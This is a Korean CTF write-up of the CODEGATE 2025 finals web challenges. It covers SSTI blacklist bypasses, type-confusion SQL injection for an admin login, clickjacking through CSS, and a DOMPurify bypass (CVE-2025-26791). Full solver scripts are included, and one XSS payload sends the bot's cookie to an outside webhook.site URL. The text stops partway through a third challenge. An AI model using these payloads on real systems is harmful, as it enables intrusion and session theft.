---
title: "[KR] 2025 CODEGATE CTF Web Challenges Final Writeup"
date: 2025-08-25 19:53:39
tags:
  - Writeup
  - CTF
  - CODEGATE
  - Korean
  - Security
  - Web
language: kr
author: Predic, goldleo1
thumbnail: "/images/thumbnail/codegate_2025_writeup.png"
copyright: "© 2025 HSPACE (이 문서의 소재에 한하여), Author : Rewrite Lab (김민찬, 박진완)"
---

# TL;DR

![image.png](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image.png)

해당 포스트는 **2025 CODEGATE CTF 본선 WEB 분야 Writeup**으로, 청소년부 2문제와 일반부 3문제로 구성되어 있다.

구성된 문제 리스트는 다음과 같다.

- 청소년부
  - Censored Board
  - Masquerade-REVENGE
- 일반부
  - securewebmail
  - chachadotcom
  - gravelbox (일반부 / 청소년부 공통 출제)

각 문제마다 취약점 분석과 익스플로잇 과정을 단계별로 다룰 예정이며, 특히 **SSTI Bypass, DOMPurify Bypass, Node.js ROP, open_basedir TOCTOU Bypass**와 같은 다양한 기법들이 실제 문제에서 어떻게 활용되었는지를 상세히 설명할 것이다.

# [WEB] Censored Board

## TL;DR

이 챌린지는 **SSTI**를 이용하여 /flag를 읽어내는 챌린지이다. python의 jinja2 모듈에는 template rendering 기능이 존재하고, 이때 공격자의 입력값이 렌더링 된다면 SSTI가 발생한다.
다만, 외부로 요청을 보내는 것이 막혀있어 flag를 읽은 후 게시글을 작성하여 그 게시물을 열람해서 flag를 얻어야 한다. 또한 XSS와 SSTI를 둘다 이용하여 flag를 획득할 수도 있다.

## Overview

`/flag` 에 위치한 flag를 읽어야 한다.

```python
@app.route("/", methods=["GET"])
def index():
    return render_template('index.html', articles=articles)
```

`/` 에 접속하면 articles 배열에 있는 내용을 모두 보여준다.

```html
{% for article in articles %}
<div class="bg-white shadow rounded-lg p-6 mb-4 hover:shadow-md transition">
  <h2 class="text-xl font-semibold text-blue-600">{{ article.title }}</h2>
  <p class="text-gray-700 mt-2">{{ article.content }}</p>
</div>
{% endfor %}
```

`/write` 엔드포인트에서 `title`과 `content` 파라미터를 전달하면, 봇이 해당 값을 포함한 채 `/article` 경로로 접근하여 해당 게시글을 열람하게 할 수 있다.

```python
@app.route("/write", methods=["GET", "POST"])
def write():
    if request.method == 'POST':
        title = request.form.get("title", "")
        content = request.form.get("content", "")

        url = f"http://localhost:5000/article?title={title}&content={content}"

        # Admin will censor article.
        try:
            visit_url(url)
        except Exception as e:
            return f"Error: {e}", 500

        return "<script>alert('Submitted.');location.href='/';</script>"

    return render_template('write.html')
```

`/article`과 `/accept`는 `@localhost_only`로 제한이 걸려있어 외부에서 접속할 수 없다.

따라서 위에 있는 `/write`에서 bot으로 요청을 보내 `/article`에 접속할 수 있다.

```python
BLACKLIST = [
    r'__', r'\.', r'\[', r'\]', r'\+',
    r'request', r'config', r'os', r'subprocess',
    r'import', r'init', r'globals', r'open', r'read', r'mro', r'class'
]

def is_safe(s):
    return not any(re.search(b, s, re.IGNORECASE) for b in BLACKLIST)

@app.route("/article", methods=["GET"])
@localhost_only
def view():
    result = ""
    title = request.args.get("title", "")
    content = request.args.get("content", "")

    if title != "" and content != "":
        if is_safe(title) & is_safe(content):
            template = f"Title: { title }<br>Content: { content }"
            result = render_template_string(template)
        else:
            result = "Blocked"

    return f"""
        <pre>{result}</pre>
        <form action="/accept" method="POST">
            <input name="title" value="{title}" type="hidden">
            <input name="content" value="{content}" type="hidden">
            <button type="submit">Submit article</button>
        </form>
    """
```

`/article` 에서 글쓰기를 할 수 있고, render_template_string에서 **SSTI**가 발생하고, **XSS**또한 발생한다.

`is_safe()` 함수를 통해 `__`, `.` , `[`, `]`등을 필터링하고 있지만 간단히 우회가 가능하다.

```docker
CMD sh -c "\
    iptables -A OUTPUT -o lo -j ACCEPT && \
    iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT && \
    iptables -P OUTPUT DROP && \
    su -s /bin/sh ctf -c 'python3 app.py'"
```

단순한 SSTI를 통해 flag를 읽고 공격자의 서버로 flag를 전송하면 될 것 같지만,`OUTPUT DROP` 설정 때문에 외부로 나가는 요청이 불가능하다. 따라서 flag를 확인할 수 있는 다른 방법을 찾아야 한다.

```python
@app.route("/accept", methods=["POST"])
@localhost_only
def accept():
    title = request.form.get("title", "")
    content = request.form.get("content", "")

    articles.append({"title": title, "content": content})

    return redirect('/')
```

`/accept` 로 POST 요청을 보내면 articles에 글을 추가하므로 `/` 에서 열람이 가능하다.

## Solution

핵심 아이디어는 다음과 같다.

1. SSTI로 `/flag` 읽어 오기.
2. XSS로 `/accept` 로 요청보내기

또는 SSTI만을 사용해 한번에 flag 읽기와 글쓰기를 실행할 수 있다.

### 1.1 SSTI로 `/flag` 읽어 오기

```python
BLACKLIST = [
    r'__', r'\.', r'\[', r'\]', r'\+',
    r'request', r'config', r'os', r'subprocess',
    r'import', r'init', r'globals', r'open', r'read', r'mro', r'class'
]
```

`__`가 필터링되서 일반적인 SSTI 페이로드를 사용하는데 어려움이 있다.

[SSTI-Vulnerability(me2nuk)](https://me2nuk.com/SSTI-Vulnerability)를 참고하여 BLACKLIST를 우회할 수 있다.

위 블로그를 보고 나서 2개의 방법을 활용하여 아래와 같은 페이로드를 제작할 수 있다.

```python
{{ ''|attr('__class__') }} # 대괄호 우회
{{ ''|attr('\x5f\x5fclass\x5f\x5f') }} # 언더바 우회 (문자 우회)
```

![@localhost_only 해제 후 테스트](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%201.png)

@localhost_only 해제 후 테스트

```python
</pre><pre id="flag">{{()|attr('\x5f\x5fcl\x61ss\x5f\x5f')|attr('\x5f\x5fb\x61se\x5f\x5f')|attr('\x5f\x5fsubcl\x61sses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(485)('cat /flag',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('decode')('utf-8')}}</pre><pre>
```

flag 파싱을 간단하게 하기 위해 새로운 `<pre id=”flag”>` 태그를 넣어줬다.

---

### 1.2 SSTI 필터를 우회하는 다른 방법

Codegate 2025 Finals에서 [Void](https://pdw0412.tistory.com/)가 아래와 같은 방법으로 풀이하였다.

전체적인 익스플로잇 흐름은 유사하지만 `\`를 사용하지 않은게 흥미로워서 인용하였다.

페이로드를 먼저 보면 아래와 같다.

```html
{% set u='_' %}{% set d=u*2 %} {% set g =
cycler|attr(d~'i'~'n'~'i'~'t'~d)|attr(d~'g'~'l'~'o'~'b'~'a'~'l'~'s'~d) %} {% set
get_fg = g | attr('g'~'e'~'t') %} {{get_fg}} {% set b =
get_fg(d~'b'~'u'~'i'~'l'~'t'~'i'~'n'~'s'~d) %} {% set get_fb = b |
attr('g'~'e'~'t') %} {% set imp = get_fb(d~'i'~'m'~'p'~'o'~'r'~'t'~d) %} {{imp}}
{% set dot = get_fb('chr')(46) %} {% set http = imp('h' ~ 't' ~ 't' ~ 'p' ~ dot
~ 'c' ~ 'l' ~ 'i' ~ 'e' ~ 'n' ~ 't') %} {{http}} {% set httpc =
imp('h'~'t'~'t'~'p'~dot~'c'~'l'~'i'~'e'~'n'~'t', None, None, ('client',)) %} {%
set lh = 'localho'~'st' %} {{lh}} {% set conn = httpc|attr('HTTPConnection')(lh,
5000) %} {{conn}} {% set rq = 'r'~'e'~'q'~'u'~'e'~'s'~'t' %} {% set str_op =
'op'~'en' %} {{str_op}} {% set op = get_fb(str_op) %} {{op}} {% set rd =
'r'~'e'~'a'~'d' %} {% set flag = op('/flag')|attr(rd)() %} {{flag}} {% set body
= 'title=win&content=' ~ flag|urlencode %} {% set hdrs =
{'Content-Type':'application/x-www-form-urlencoded'} %} {% set str_pt =
'PO'~'ST' %} {{str_pt}} {{ conn | attr(rq)(str_pt, '/accept', body, hdrs) }} {{
conn | attr('g'~'e'~'t'~'r'~'e'~'s'~'p'~'o'~'n'~'s'~'e')() }}
```

jinja2에서 변수를 선언하기 위해서는 `{% name = value %}`와 같은 방식으로 선언해야한다.

`__` (언더바 2개) 필터링을 우회하기 위해 `{% set u='_' %}{% set d=u*2 %}`를 사용한다.

이후에 **`cycler.init.globals.__builtins__.import`** 로 `http.client`를 불러오고, `open('/flag')`를 통해 읽은 flag를 `/accept`에 POST 요청으로 보내 flag를 서버에 저장하고, flag를 읽어온다.

---

### 2. XSS로 `/accept` 로 요청보내기

이제 BLACKLIST를 우회해서 XSS를 실행해야 한다.

간단하게 하기 위해서 XSS 코드를 작성 후 이를 base64로 인코딩 하여 eval하는 방식을 선택했다.

1. **원본 코드**

```jsx
window.onload = () => {
  document.querySelector("input").value =
    document.querySelector("pre#flag").textContent;
  document.querySelector("button").click();
};
```

`pre#flag` 에 담긴 flag를 읽어와 `input.value`에 넣어서 `form`을 통해 `/accept`로 POST 요청을 보낸다.

1. **base64 + URL encoding**

```
d2luZG93Lm9ubG9hZD0oKT0+e2RvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2lucHV0JykudmFsdWUgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdwcmUjZmxhZycpLnRleHRDb250ZW50O2RvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2J1dHRvbicpLmNsaWNrKCk7fTs=
```

base64 encoding 후 GET 파라미터에 들어갈 때 `+`등의 문자가 특수문자로 사용되는 것을 막기 위해 URL encoding을 했다.

## Solver

```python
import requests as req
from base64 import b64encode
from urllib.parse import quote
import re

url = 'http://localhost:5000'

ssti_payload = '''
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(485)('cat /flag',shell=True,stdout=-1)|attr('communicate')()|attr('__getitem__')(0)|attr('decode')('utf-8')}}
'''.strip().replace('_','\\x5f').replace('c', '\\x63')

xss_payload = b'''window.onload=()=>{document.querySelector('input').value = document.querySelector('pre#flag').textContent;document.querySelector('button').click();};'''
xss_payload = quote(b64encode(xss_payload))
xss_payload = f'<script>eval(atob(decodeURIComponent("{xss_payload}")))</script>'

payload = '</pre><pre id="flag">' + ssti_payload + '</pre>' + xss_payload + '<pre>'

res = req.post(f'{url}/write', data={
    'title': 'dummy',
    'content': quote(payload)
})

res = req.get(url)
flag = re.findall(r"codegate2025\{.+\}", res.text)[0]

print(flag)
```

# [WEB] Masquerade-REVENGE

## TL;DR

이 챌린지는 예선에 출제된 Masquerade의 REVENGE 챌린지로 **SQL Injection**, **Click Jacking**, **DOMPurify Bypass (CVE-2025-26791)** 세 가지 취약점을 연계하여 bot의 JWT token에서 flag를 획득하는 챌린지이다.

로그인 시에 데이터의 타입 검증이 누락되어 **SQL Injection**이 발생한다. 그 다음 bot이 자동으로 `#delete` 버튼을 클릭하는 로직을 이용하여, CSS로 공격자가 입력한 버튼의 위치를 조작해 **Click Jacking** 공격을 수행하고 bot을 `/admin/test` 페이지로 유도시킨다. `/admin/test`에서는 CSP가 `unsafe-inline`을 허용하므로, DOMPurify의 CVE-2025-26791 취약점을 통해 **XSS** 페이로드를 삽입한다.
최종적으로 XSS가 실행되어 bot의 cookie을 외부 웹훅 서버로 전송하고, flag를 획득할 수 있다.

## Overview

```docker
FROM node:20-bullseye-slim

RUN apt-get update && apt-get install -y \
    chromium \
    fonts-liberation \
    libx11-xcb1 \
    libnspr4 \
    libnss3 \
    libxcomposite1 \
    libxdamage1 \
    libxfixes3 \
    libxrandr2 \
    --no-install-recommends && \
    rm -rf /var/lib/apt/lists/*

COPY . /app/

WORKDIR /app

RUN npm install

EXPOSE 3000

CMD ["node", "index.js"]
```

Dockerfile에서 `chromium`을 사용하는 것을 통해 XSS, CSRF등의 Client Side 챌린지임을 알 수 있다.

```jsx
// app/utils/report.js:6:39
const viewUrl = async (post_id) => {
  const token = generateToken({
    username: "codegate2025{fake_flag}",
    role: "ADMIN",
    hasPerm: true,
  });

  const cookies = [{ name: "jwt", value: token, domain: "localhost" }];

  const browser = await puppeteer.launch({
    executablePath: "/usr/bin/chromium",
    args: ["--no-sandbox"],
  });

  let result = true;

  try {
    await browser.setCookie(...cookies);

    const page = await browser.newPage();

    await page.goto(`http://localhost:3000/post/${post_id}`, {
      timeout: 3000,
      waitUntil: "domcontentloaded",
    });

    await delay(1000);

    const button = await page.$("#delete");
    await button.click();

    await delay(1000);
  } catch (error) {
    console.error("An Error occurred:", error);
    result = false;
  } finally {
    await browser.close();
  }

  return result;
};
```

그래서 bot 동작을 먼저 살펴보았다. bot 동작을 살펴보면 `/post/${post_id}`에 방문 후, 1초 후에 `#delete` 버튼을 클릭한다.

cookies에 `jwt.encode()`된 flag가 존재하므로 Client Side 관련 챌린지임을 확실하게 판단할 수 있다.

```jsx
// app/index.js:27:49
app.use((req, res, next) => {
  const nonce = crypto.randomBytes(16).toString("hex");

  res.setHeader("X-Frame-Options", "deny");

  if (req.path.startsWith("/admin")) {
    res.setHeader(
      "Content-Security-Policy",
      `default-src 'self'; script-src 'self' 'unsafe-inline'; base-uri 'none'`,
    );
  } else {
    res.setHeader(
      "Content-Security-Policy",
      `default-src 'self'; script-src 'nonce-${nonce}'; base-uri 'none'`,
    );
  }

  res.locals.nonce = nonce;

  next();
});

app.use("/", mainRoute);
app.use("/auth", authRoute);
app.use("/user", userRoute);
app.use("/post", postRoute);
app.use("/admin", adminRoute);
app.use("/dev", devRoute);
app.use("/report", reportRoute);
```

애플리케이션의 CSP 정책을 보면, `/admin/` 경로에서만 `script-src 'self' 'unsafe-inline'`이 허용되어 있고, 나머지 엔드포인트에서는 `script-src 'nonce-${nonce}'`로 제한되어 있다.

nonce는 `crypto.randomBytes()`를 통해 무작위로 생성되므로 우회가 거의 불가능하다. 따라서 JavaScript 코드를 실행하기 위해서는 `/admin/` 경로를 활용하는 것이 유일한 방법이다.

이 서버에는 role이 존재하고 특정 role만 특정 동작을 수행할 수 있는데, ADMIN또는 INSPECTOR가 `/user/role` 에서 임의 유저의 role을 변경할 수 있다.

```jsx
router.post("/role", async (req, res) => {
  const isStaff = await isPrivileged(req.user.role);
  if (isStaff)
    return res
      .status(400)
      .json({ message: "Staff accounts are not allowed to change role." });

  const { role } = req.body;
  const result = await setUserRole(req.user.username, role);
  if (!result) return res.status(400).json({ message: "Invalid Role." });

  res.json({ message: "Role Changed." });
});
```

- INSPECTOR - **report** 기능 사용 가능

```jsx
// app/routes/report.js:18:27
if (req.user.role !== "INSPECTOR") {
        message = "No Permission.";
        code = 403;
  }
  else {
      const result = await viewUrl(post_id);
      ...
  }
```

- ADMIN - `/admin/` 하위 페이지 접근 가능

```jsx
// app/utils/guard.js:1:5
const adminGuard = (req, res, next) => {
  if (req.user.role !== "ADMIN")
    return res.status(403).json({ message: "Forbidden." });

  next();
};
```

- DEV, BANNED - 챌린지 풀이에 필요하지 않음.

또한 `perm = true` 여야지만 post를 작성할 수 있다.

```jsx
// app/routes/post.js:28:42
router.post('/write', async (req, res) => {
    const isStaff = await isPrivileged(req.user.role);
    if (isStaff) return res.status(400).json({ message: "Staff accounts are not allowed to write posts." });

    const hasPerm = await getUserPerm(req.user.username);
    if (!hasPerm) return res.status(400).json({ message: "You have no permission." });
    ...
});
```

```jsx
// app/models/userModel.js:57:69
const getUserPerm = async (username) => {
    const query = 'SELECT * FROM users WHERE username = ? AND hasPerm = true';
		...
}
```

## Solution

챌린지를 해결하기 위한 핵심 아이디어는 다음과 같다.

1. **INSPECTOR, ADMIN 권한 획득**
2. **Click Jacking**
3. **`/admin/test` 에서의 XSS (CVE-2025-26791)**

### 1. INSPECTOR, ADMIN 권한 획득

```sql
// db/initdb.d:7:23
INSERT INTO users (username, password, hasPerm, role) VALUES
('admin', 'fake_admin_password', true, 'ADMIN'),
('inspector', 'fake_inspector_password', false,  'INSPECTOR');
```

DB를 초기화 할 때 ADMIN 권한을 가진 계정과 INSPECTOR 권한을 가진 계정을 하나씩 생성한다.

```jsx
// app/routes/auth.js:9:17
router.post("/login", async (req, res) => {
  const { username, password } = req.body;

  const token = await login(username, password);

  if (!token) return res.status(401).json({ message: "login failed." });
  return res.json({ message: "Logged in successfully.", token });
});
```

`/auth/login` 에서는 username과 password의 type을 검사하지 않는다.

```jsx
// app/models/userModel.js:21:41
const login = async (username, password) => {
  const query = "SELECT * FROM users WHERE username = ? AND password = ?";

  try {
    const results = await db.query(query, [username, password]);

    if (results.length === 0) return false;
    if (results[0].role === "BANNED") return false;

    payload = {
      username: username,
      role: results[0].role,
    };

    const token = generateToken(payload);
    return token;
  } catch {
    return false;
  }
};
```

원하는 type의 값을 넣을 수 있기 때문에 SQL Injection이 발생한다.

[Express.js + MySQL SQLi(RAON - Core Research Team)](https://core-research-team.github.io/2020-10-01/Expressjs)

```python
import requests as req

url = 'http://localhost:3000'

admin = req.Session()

res = admin.post(f'{url}/auth/login', json={
    'username': 'admin',
    'password': {'password': '1'}
})
print(res.text)
# {"message":"Logged in successfully.","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6IkFETUlOIiwiaWF0IjoxNzUzMzE0NTM1LCJleHAiOjE3NTMzMTgxMzV9.-Nq_m0IvZFHE4_BF4eXr1Sag4NClSrg5qd5EVtA5TFQ"}
```

이제 모든 기능을 사용할 수 있다!

### 2. Click Jacking

우선 post에서 직접 XSS를 발생시키는 방식은 `Dompurify.sanitize()` 때문에 불가능하다. 하지만 `/admin/test` 에서는 구글링을 통해 XSS ([CVE-2025-26791](https://nvd.nist.gov/vuln/detail/CVE-2025-26791))가 가능하다는 것을 알 수 있다.

따라서 `/post/${post_id}`에 방문한 bot을 `/admin/test` 로 이동시킬 방법을 생각해야 한다. (Open Redirect, **Click Jacking**, etc.)

```jsx
// app/routes/post.js:44:68
router.get("/:post_id", async (req, res) => {
  const post = await getPostById(req.params.post_id);

  if (!post) return res.status(404).json({ message: "Post Not Found." });

  const window = new JSDOM("").window;
  const DOMPurify = createDOMPurify(window);

  const config = {
    FORBID_TAGS: ["meta", "iframe"],
    FORBID_ATTR: ["onerror", "onload", "onclick"],
  };

  const sanitizedTitle = DOMPurify.sanitize(post.title, config);
  const sanitizedContent = DOMPurify.sanitize(post.content, config);

  res.render("post/view", {
    post: {
      post_id: post.post_id,
      title: sanitizedTitle,
      content: sanitizedContent,
      theme: post.theme,
    },
  });
});
```

config에서 `<meta>` 를 차단하고 있기 때문에 refresh를 이용한 redirect는 불가능하다.

따라서 다른 방법을 생각해본다면 bot이 `#delete` 버튼을 누른다는 점을 이용하여 버튼을 잘못 클릭하게 만드는 Click Jacking 공격을 생각해 볼 수 있다.

```jsx
const button = await page.$("#delete");
await button.click();
```

일반적인 상황에서 id로 HTML 요소를 선택했을 경우에는 Click Jacking이 불가능하다.

[https://developer.mozilla.org/en-US/docs/Web/API/Document/querySelector](https://developer.mozilla.org/en-US/docs/Web/API/Document/querySelector)

(querySelector의 결과가 문서에서 두 번 이상 잘못 사용된 ID와 일치하면 해당 ID를 가진 첫 번째 요소가 반환된다.)

```html
<div id="A">1</div>
<div id="A">2</div>

<script>
  console.log(document.querySelector("#A").textContent); // 1
</script>
```

하지만 puppeteer의 구현 덕분에 가능하다. 아래는 puppeteer에서 id 기반으로 특정 요소를 클릭할 때 동작하는 실제 코드 라인이다.

```tsx
@throwIfDisposed()
@bindIsolatedHandle
async click(
    this: ElementHandle<Element>,
    options: Readonly<ClickOptions> = {},
): Promise<void> {
    await this.scrollIntoViewIfNeeded();
    const {x, y} = await this.clickablePoint(options.offset);
    await this.frame.page().mouse.click(x, y, options);
}

```

[https://github.com/puppeteer/puppeteer/blob/b4d4d1915f729a2760a8c74b50877d92ce5e1c94/packages/puppeteer-core/src/api/ElementHandle.ts#L760](https://github.com/puppeteer/puppeteer/blob/b4d4d1915f729a2760a8c74b50877d92ce5e1c94/packages/puppeteer-core/src/api/ElementHandle.ts#L760)

위와 같이 puppeteer가 `$().click()`을 실행할 때 선택된 요소의 position을 구한 후 해당 위치를 클릭하기 때문에 CSS를 통하여 **position 또는 z-index** 등을 조작하여 Click Jacking이 가능하다.

다만 CSP가 `default-src 'self';` 이기 때문에 `post.theme` 으로 서버에 존재하는 css를 로드해야한다.

```html
<!-- app/views/post/view.ejs:9 -->
<link rel="stylesheet" href="/css/theme/<%= post.theme %>.css" />
```

제공된 소스파일에서 `app/public/css/switch.css`에 좋은 가젯이 있다는 것을 확인할 수 있다.

```css
/* app/public/css/switch.css:16:26 */
.slider {
  position: absolute;
  cursor: pointer;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background-color: #ccc;
  -webkit-transition: 0.4s;
  transition: 0.4s;
}
```

위 코드를 보면 확인할 수 있듯이 `slider` 속성을 주게 되면 버튼으로 화면의 viewpoirt가 전부 채워지게 된다.

![<button class="slider"></button>](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%202.png)

<button class="slider"></button>

이제 Click Jacking을 통해 원하는 URL로 요청을 보낼 수 있다.

```html
<form id="a" action="//localhost:3000/admin/test">
  <input type="text" name="content" value="xxxx" /><button
    id="delete"
    form="a"
    class="slider"
  >
    a
  </button>
</form>
```

### 3. `/admin/test` 에서의 XSS (CVE-2025-26791)

`/admin/test` 에 접근하면 `test.ejs` 파일을 렌더링 해주는 것을 알 수 있다.

```html
<!-- app/views/admin/test.ejs:14:42 -->
<script>
  window.addEventListener("load", async () => {
    const post_title = document.querySelector(".post_title");
    const post_content = document.querySelector(".post_content");
    const error_div = document.querySelector(".error_div");

    const urlSearch = new URLSearchParams(location.search);
    const urlTitle = urlSearch.get("title");
    const urlContent = urlSearch.get("content");

    const result = await fetch("/admin/sanitize", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        title: atob(urlTitle),
        content: atob(urlContent),
      }),
    });

    const { title, content } = await result.json();

    post_title.innerHTML = title;
    post_content.innerHTML = content;
  });
</script>
```

코드를 확인해보면 URLSearchParams에서 `title`과 `content`를 가져와서 base64 decoding을 진행한 후에 `/admin/sanitize` 로 요청을 보내서 sanitize한 결과를 innerHTML을 통해 페이지에 랜더링한다.

```jsx
const config = {
  SAFE_FOR_TEMPLATES: true,
  CUSTOM_ELEMENT_HANDLING: {
    tagNameCheck: /^custom-/,
  },
};

router.post("/sanitize", (req, res) => {
  const { title, content } = req.body;

  const window = new JSDOM("").window;
  const DOMPurify = createDOMPurify(window);

  const sanitizedTitle = DOMPurify.sanitize(title, config);
  const sanitizedContent = DOMPurify.sanitize(content, config);

  res.json({ title: sanitizedTitle, content: sanitizedContent });
});
```

`/admin/sanitize` 의 로직을 확인해보면 `config`에서 `SAFE_FOR_TEMPLATES` 와 `CUSTOM_ELEMENT_HANDLING` 의 프로퍼티를 가져와 sanitize 과정에서 사용하는 것을 알 수 있다.

이때, 위 config의 설정 값을 구글링하면 [CVE-2025-26791](https://nvd.nist.gov/vuln/detail/CVE-2025-26791) 라는 1day 취약점을 활용하는 챌린지임을 어렵지 알아낼 수 있다.

```html
<math
  ><custom-test
    ><mi
      ><li>
        <table>
          <custom-test><li></li></custom-test
          ><a>
            <style>
              <! \${
            </style>
            }
            <custom-b
              id="><img src onerror='location.href=`https://a393275e-a197-4977-9eb3-8a0cd803aab8.webhook.site/?q=`.concat(document.cookie);'>"
              >hmm...</custom-b
            >
          </a>
        </table>
      </li></mi
    ></custom-test
  ></math
>
```

PoC 페이로드를 가져와서 현재 챌린지 환경에 맞게 페이로드를 재설정한다음 base64 encoding을 진행해서 전달하면 최종적으로 챌린지를 해결할 수 있다.

## Solver

```python
import requests as req

url = 'http://localhost:3000'

admin = req.Session()
user = req.Session()
inspector = req.Session()

username = 'goldleo1'
password = 'af049f3jforgjju0'

res = admin.post(f'{url}/auth/login', json={
    'username': 'admin',
    'password': {'password': '1'}
})
admin.cookies.update({"jwt": res.json().get('token')})

res = inspector.post(f'{url}/auth/login', json={
    'username': 'inspector',
    'password': {'password': '1'}
})
inspector.cookies.update({"jwt": res.json().get('token')})

res = user.post(f'{url}/auth/register', json={
    'username': username,
    'password': password
})
res = user.post(f'{url}/auth/login', json={
    'username': username,
    'password': password
})
user.cookies.update({"jwt": res.json().get('token')})

res = admin.post(f'{url}/admin/user/perm', json={
    'username': username,
    'value': True
})

res = user.post(f'{url}/post/write', json={
    'title': 'dummy',
    'content': '<form action="//localhost:3000/admin/test"><input type="text" name="content" value="PG1hdGg+PGN1c3RvbS10ZXN0PjxtaT48bGk+PHRhYmxlPjxjdXN0b20tdGVzdD48bGk+PC9saT48L2N1c3RvbS10ZXN0PjxhPg0KICAgICAgPHN0eWxlPg0KICAgICAgICA8ISBcJHsNCiAgICAgIDwvc3R5bGU+DQogICAgICB9DQogICAgICA8Y3VzdG9tLWIgaWQ9Ij48aW1nIHNyYyBvbmVycm9yPSdsb2NhdGlvbi5ocmVmPWBodHRwczovL2EzOTMyNzVlLWExOTctNDk3Ny05ZWIzLThhMGNkODAzYWFiOC53ZWJob29rLnNpdGUvP3E9YC5jb25jYXQoZG9jdW1lbnQuY29va2llKTsnPiI+aG1tLi4uPC9jdXN0b20tYj4NCiAgICA8L2E+PC90YWJsZT48L2xpPjwvbWk+PC9jdXN0b20tdGVzdD48L21hdGg+"><button id="delete" class="slider">a</button></form>' ,
    'theme': '../switch'
})
post_id = res.json().get('post')

res = inspector.get(f'{url}/report/{post_id}')
	print(res.text)
```

![webhook.site로 온 jwt token](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%203.png)

webhook.site로 온 jwt token

![Get FLAG!](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%204.png)

Get FLAG!

# [WEB] securewebmail

## TL;DR

이 챌린지는 **Charset Encoding을 이용한 Dompurify Bypass**를 통해 bot의 Cookie를 탈취하는 유형이다.

브라우저는 다양한 문자 인코딩 방식을 지원하는데, 이를 활용하면 특정 시퀀스를 다른 charset으로 해석하도록 유도하여 필터링을 우회할 수 있다. 즉, Dompurify가 처리하는 방식과 실제 브라우저가 렌더링하는 방식 사이의 차이를 이용해 우회가 가능하다.

다만, 이 챌린지에는 의도되지 않은 풀이법이 존재했으며, 그 영향으로 CodeGate CTF 본선 WEB 분야에서 가장 많은 풀이자가 나온 챌린지이기도 하다.

아래에서는 먼저 의도된 풀이 과정을 설명하고, 이어서 의도되지 않은 풀이 방법에 대해서도 살펴보겠다.

## Overview

먼저, 회원가입을 진행하면은 Compose를 통해 mail을 작성하여 다른 사람에게 전송할 수 있다.

![회원가입 페이지](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%205.png)

회원가입 페이지

![메일 작성 페이지](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%206.png)

메일 작성 페이지

메일 전송은 `POST /compose` 에서 이루어지며 해당 메일은 smtpService를 활용하여 전송된다.

![[MailboxService.java](http://MailboxService.java) 메일 전송 코드](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%207.png)

[MailboxService.java](http://MailboxService.java) 메일 전송 코드

이쯤에서 flag 위치를 확인하면 flag는 bot의 쿠키에 저장되어 있다.

이때, bot의 쿠키가 `httpOnly:false` 인점을 확인하여 XSS 챌린지인 것을 유추할 수 있다.

![FLAG를 쿠키에 저장함 (bot/main.js)](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%208.png)

FLAG를 쿠키에 저장함 (bot/main.js)

그리고 bot은 admin 이메일로 로그인 후 자신의 메일함에 들어가 메일을 확인하는 동작을 한다.

![ADMIN email로 로그인](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%209.png)

ADMIN email로 로그인

![받은 메일을 큐에 저장하여 하나씩 확인](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2010.png)

받은 메일을 큐에 저장하여 하나씩 확인

위의 내용을 바탕으로 다음과 같은 exploit 시나리오를 생각할 수 있다.

1. 메일에 XSS가 발생하는 악성 html코드 삽입
2. 메일을 admin@securemail.com으로 전송
3. admin이 해당 메일을 열어보고 XSS가 발생하여 쿠키가 유출됨

그러나, 해당 메일에는 대략 두개 정도의 필터링이 적용 되어있다.

![Mailcontroller.java, email Content를 갖고오는 emailContent 함수](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2011.png)

Mailcontroller.java, email Content를 갖고오는 emailContent 함수

1. Jsoup.clean 필터링

받은 메일을 확인할때 먼저 `parseMessage`함수를 통해 1차적인 필터링이 적용된다.

![[MailboxService.java](http://MailboxService.java), parseMessage함수](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2012.png)

[MailboxService.java](http://MailboxService.java), parseMessage함수

safelist에 적용된 내용을 보면 다음과 같다.

- `<style>`태그 허용
- 인라인 style 허용
- `<img>`태그에 src,alt,title,width,height속성 허용
- `<img>`태그에 src속성에 http, https, data 프로토콜 허용

그 후 `Jsoup.clean`으로 필터링된 값을 message Content에 적용하고 mail의 contentType의 charset을 갖고와 해당 응답의 charset에 적용한다.

1. Dompurify 필터링

